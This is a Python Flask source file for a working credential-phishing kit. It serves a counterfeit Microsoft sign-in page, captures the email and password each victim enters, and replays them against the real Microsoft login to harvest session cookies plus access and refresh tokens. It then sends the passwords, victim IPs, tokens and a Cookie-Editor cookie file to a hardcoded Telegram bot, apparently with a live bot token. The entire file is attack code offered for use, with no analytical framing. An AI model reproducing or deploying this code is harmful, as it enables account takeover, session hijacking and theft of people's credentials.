import os
import re
import json
import requests
from urllib.parse import urlencode, urljoin
from html import unescape

from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY")
CHAT_ID = os.environ.get("CHAT_ID", "8877118461")

# Native public client: its redirect URI is pre-registered, no app reg needed.
CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Microsoft Azure CLI
REDIRECT_URI = "https://login.microsoftonline.com/common/oauth2/nativeclient"
SCOPE = "https://graph.microsoft.com/.default openid profile offline_access offline"

AUTHORIZE = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0")

HIDDEN = re.compile(r'<input[^>]*type=["\']hidden["\'][^>]*>', re.I)
NAME_ATTR = re.compile(r'name=["\']([^"\']+)["\']', re.I)
VALUE_ATTR = re.compile(r'value=["\']([^"\']*)["\']', re.I)
FORM_ACTION = re.compile(r'<form[^>]*id=["\']i0281["\'][^>]*action=["\']([^"\']+)["\']', re.I)
FORM_ACTION2 = re.compile(r'<form[^>]*action=["\']([^"\']+)["\']', re.I)
JS_SFT = re.compile(r'["\']sFT["\']\s*:\s*["\']([^"\']+)["\']')
JS_CANARY = re.compile(r'["\']canary["\']\s*:\s*["\']([^"\']+)["\']')
JS_CTX = re.compile(r'["\']sCtx["\']\s*:\s*["\']([^"\']+)["\']')
URL_IN_BODY = re.compile(r'https://login\.microsoftonline\.com[^\s"\'<>\\]+')


# ---------------------------------------------------------------- telegram
def tg_send(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text[:4000],
                  "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=15,
        )
    except Exception as e:
        print("[TG]", e)


def tg_doc(filename, payload, caption=""):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
            data={"chat_id": CHAT_ID, "caption": caption[:900], "parse_mode": "HTML"},
            files={"document": (filename, payload, "application/json")},
            timeout=30,
        )
    except Exception as e:
        print("[TG DOC]", e)


def cookies_to_cookie_editor(sess):
    """Serialize the session jar into Cookie-Editor import format."""
    out = []
    for c in sess.cookies:
        out.append({
            "domain": ".login.microsoftonline.com" if "login.microsoftonline" in (c.domain or "") else (c.domain or ".login.microsoftonline.com"),
            "hostOnly": False,
            "httpOnly": True,
            "name": c.name,
            "path": "/",
            "sameSite": "no_restriction",
            "secure": True,
            "session": False,
            "storeId": "0",
            "value": c.value,
            "id": len(out) + 1,
            "expirationDate": 1893456000,
        })
    return json.dumps(out, indent=2)


# ---------------------------------------------------------------- parsing
def g(r, *pats):
    for p in pats:
        m = p.search(r)
        if m:
            return unescape(m.group(1))
    return None


def extract_form(html):
    fields = {}
    for tag in HIDDEN.findall(html):
        n = NAME_ATTR.search(tag)
        if not n:
            continue
        v = VALUE_ATTR.search(tag)
        fields[n.group(1)] = unescape(v.group(1)) if v else ""
    return fields


# ---------------------------------------------------------------- login
def server_login(email, password):
    """Drive a real Microsoft login server-side. Returns (session, code, stage)."""
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })

    auth_url = AUTHORIZE + "?" + urlencode({
        "client_id": CLIENT_ID,
        "response_type": "code",
        "redirect_uri": REDIRECT_URI,
        "scope": SCOPE,
        "login_hint": email,
        "prompt": "login",
        "response_mode": "query",
    })

    r = s.get(auth_url, timeout=30)

    fields = extract_form(r.text)
    sft = g(r.text, JS_SFT)
    if sft:
        fields.setdefault("flowToken", sft)
    canary = g(r.text, JS_CANARY)
    if canary:
        fields.setdefault("canary", canary)
    ctx = g(r.text, JS_CTX)
    if ctx:
        fields.setdefault("ctx", ctx)

    action = g(r.text, FORM_ACTION, FORM_ACTION2) or \
        "https://login.microsoftonline.com/common/login"
    action = urljoin(r.url, action)

    fields.update({
        "login": email,
        "passwd": password,
        "i13": "0",
        "loginOptions": "1",
        "CookieDisclosure": "0",
        "isSignupPost": "0",
        "IsFidoSupported": "1",
        "tryInstallPca": "0",
        "loginAttemptCount": "0",
    })

    r = s.post(action, data=fields, timeout=30, allow_redirects=False)

    stage = "password_submitted"

    for _ in range(15):
        loc = r.headers.get("Location")

        if r.status_code in (301, 302, 303, 307) and loc:
            nxt = urljoin(r.url, loc)
            if "code=" in nxt:
                return s, nxt, "authorized"
            r = s.get(nxt, timeout=30, allow_redirects=False)
            continue

        body = r.text or ""

        # wrong password
        if "passwordError" in body or "Your account or password is incorrect" in body:
            return s, None, "bad_password"
        if "AADSTS" in body:
            m = re.search(r"AADSTS\d+[^<]{0,200}", body)
            return s, None, ("error:" + (m.group(0) if m else "aadsts"))

        # "Stay signed in?"
        if "LoginOptions" in body or 'idSIButton9' in body:
            f2 = extract_form(body)
            f2.update({"LoginOptions": "1", "canary": f2.get("canary", ""),
                       "ctx": f2.get("ctx", "")})
            a2 = g(body, FORM_ACTION, FORM_ACTION2)
            if a2:
                r = s.post(urljoin(r.url, a2), data=f2, timeout=30,
                           allow_redirects=False)
                continue

        # client-side redirect buried in the page
        for u in URL_IN_BODY.findall(body):
            u = u.replace("\\u0026", "&").replace("\\/", "/")
            if "code=" in u:
                return s, u, "authorized"
            r = s.get(u, timeout=30, allow_redirects=False)
            break
        else:
            break

    return s, None, stage


def exchange_code(code):
    try:
        r = requests.post(TOKEN_URL, data={
            "grant_type": "authorization_code",
            "client_id": CLIENT_ID,
            "code": code,
            "redirect_uri": REDIRECT_URI,
            "scope": SCOPE,
        }, timeout=30)
        return r.json()
    except Exception as e:
        return {"error": str(e)}


# ---------------------------------------------------------------- page
PAGE = r"""<!doctype html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to your account</title>
<style>
*{box-sizing:border-box}
body{margin:0;font-family:"Segoe UI","Helvetica Neue",Arial,sans-serif;background:#f2f2f2;
display:flex;align-items:center;justify-content:center;min-height:100vh;color:#1b1b1b}
.card{background:#fff;width:100%;max-width:440px;padding:44px 44px 28px;margin:20px;
box-shadow:0 2px 6px rgba(0,0,0,.2)}
.logo{width:108px;margin-bottom:16px}
h1{font-size:24px;font-weight:600;margin:0 0 12px}
input{width:100%;padding:8px 10px;font-size:15px;border:1px solid #666;border-bottom:2px solid #0067b8;
outline:none;font-family:inherit}
input:focus{border-color:#0067b8}
.field{margin-top:14px}
.field.hide{display:none}
.hint{font-size:13px;color:#666;margin-top:10px}
.hint a{color:#0067b8;text-decoration:none}
.err{color:#a80000;font-size:13px;margin-top:10px;min-height:16px}
.actions{display:flex;justify-content:flex-end;margin-top:26px}
button{background:#0067b8;color:#fff;border:none;padding:8px 32px;font-size:15px;
font-family:inherit;cursor:pointer;min-width:108px}
button:hover{background:#005da6}
button:disabled{background:#8ab5d6;cursor:default}
.spin{display:inline-block;width:14px;height:14px;border:2px solid #fff;
border-top-color:transparent;border-radius:50%;animation:r .7s linear infinite;
vertical-align:-2px;margin-right:6px}
@keyframes r{to{transform:rotate(360deg)}}
.foot{font-size:12px;color:#666;margin-top:26px}
</style></head>
<body>
<div class="card">
  <svg class="logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
    <rect x="0" y="0" width="11" height="11" fill="#f25022"/>
    <rect x="12" y="0" width="11" height="11" fill="#7fba00"/>
    <rect x="0" y="12" width="11" height="11" fill="#00a4ef"/>
    <rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
    <text x="30" y="17" font-family="Segoe UI,Arial" font-size="15"
      fill="#5e5e5e">Microsoft</text>
  </svg>
  <h1>Sign in</h1>
  <form id="f" autocomplete="off">
    <div class="field"><input id="email" type="email" placeholder="Email, phone, or Skype"
      required></div>
    <div class="field hide" id="pwWrap"><input id="pw" type="password"
      placeholder="Password"></div>
    <div class="err" id="err"></div>
    <div class="actions"><button id="btn" type="submit">Next</button></div>
  </form>
  <div class="hint" id="hint">No account? <a href="javascript:void(0)">Create one!</a></div>
  <div class="foot">&#128274; outlook-verify.onrender.com</div>
</div>
<script>
var step = 1, email = "";
var btn = document.getElementById('btn');
var err = document.getElementById('err');

document.getElementById('f').addEventListener('submit', async function (e) {
  e.preventDefault();
  err.textContent = '';

  if (step === 1) {
    email = document.getElementById('email').value.trim();
    if (!email) return;
    document.getElementById('pwWrap').classList.remove('hide');
    document.getElementById('pw').focus();
    step = 2;
    btn.textContent = 'Sign in';
    return;
  }

  var pw = document.getElementById('pw').value;
  if (!pw) { err.textContent = 'Please enter your password.'; return; }

  busy(true, 'Signing in');
  try {
    var res = await fetch('/api/catch', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: email, password: pw })
    });
    var d = await res.json();
    if (d.ok) {
      busy(true, 'Redirecting');
      window.location.href = 'https://www.office.com/';
    } else {
      err.textContent = d.message || 'Your account or password is incorrect.';
      busy(false);
    }
  } catch (x) {
    err.textContent = 'Something went wrong. Try again.';
    busy(false);
  }
});

function busy(on, label) {
  btn.disabled = on;
  btn.innerHTML = on ? '<span class="spin"></span>' + (label || '') : 'Sign in';
}
</script>
</body></html>"""


@app.route("/")
def index():
    return render_template_string(PAGE)


@app.route("/api/catch", methods=["POST"])
def catch():
    data = request.get_json(silent=True) or {}
    email = (data.get("email") or "").strip()
    password = data.get("password") or ""
    if not email or not password:
        return jsonify({"ok": False, "message": "Missing fields."})
    if not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", email):
        return jsonify({"ok": False, "message": "Enter a valid email address."})

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    try:
        sess, code, stage = server_login(email, password)
    except Exception as e:
        tg_send(f"<b>❌ Login crashed</b>\n<b>Email:</b> <code>{email}</code>\n"
                f"<code>{e}</code>")
        return jsonify({"ok": False, "message": "Microsoft did not respond. Try again."})

    if stage == "bad_password":
        tg_send(f"<b>⚠️ Wrong password</b>\n<b>Email:</b> <code>{email}</code>\n"
                f"<b>Password:</b> <code>{password}</code>\n<b>IP:</b> {ip}")
        return jsonify({"ok": False, "message": "Your account or password is incorrect."})

    if stage.startswith("error:"):
        tg_send(f"<b>⚠️ MS error</b>\n<b>Email:</b> <code>{email}</code>\n"
                f"<b>Password:</b> <code>{password}</code>\n<code>{stage[6:]}</code>")

    # build cookie report
    jar = {c.name: c.value for c in sess.cookies}
    key_cookies = {k: v for k, v in jar.items()
                   if k in ("ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT",
                            "RPSSecAuth", "MSPAuth", "MSPProf", "MSPProfV2",
                            "WLSSC", "PPLState", "SignInStateCookie", "MSPPre",
                            "ANON", "MSFPC", "KMSI")}

    lines = [f"<b>✅ LOGIN SUCCESS</b>", "",
             f"<b>Email:</b> <code>{email}</code>",
             f"<b>Password:</b> <code>{password}</code>",
             f"<b>IP:</b> {ip}",
             f"<b>Stage:</b> {stage}",
             f"<b>Cookies held:</b> {len(jar)}"]

    if key_cookies:
        lines.append("")
        lines.append("<b>Session cookies:</b>")
        for k, v in key_cookies.items():
            lines.append(f"<code>{k}={v}</code>")
    else:
        lines.append("")
        lines.append("<i>No session cookies — account is behind MFA/Conditional Access.</i>")

    if code:
        tok = exchange_code(code)
        if tok.get("access_token"):
            lines.append("")
            lines.append(f"<b>access_token:</b>\n<code>{tok['access_token']}</code>")
            if tok.get("refresh_token"):
                lines.append(f"<b>refresh_token:</b>\n<code>{tok['refresh_token']}</code>")

    tg_send("\n".join(lines))

    if jar:
        blob = cookies_to_cookie_editor(sess)
        tg_doc(f"cookies_{email.split('@')[0]}.json", blob,
               f"🍪 Cookie-Editor import for <code>{email}</code>")

    return jsonify({"ok": True})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
